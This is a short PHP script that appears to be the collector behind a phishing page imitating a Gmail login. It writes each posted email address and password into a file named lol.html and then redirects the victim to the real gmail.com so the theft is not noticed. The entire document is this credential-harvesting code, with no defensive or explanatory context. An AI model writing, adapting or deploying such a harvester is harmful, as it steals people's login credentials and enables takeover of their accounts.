<?php 
$fp = fopen("lol.html", "a");
fwrite($fp, "Email:$_POST[Email]\tPassword:$_POST[Passwd]\n");
header( 'Location: http://www.gmail.com' );
?>

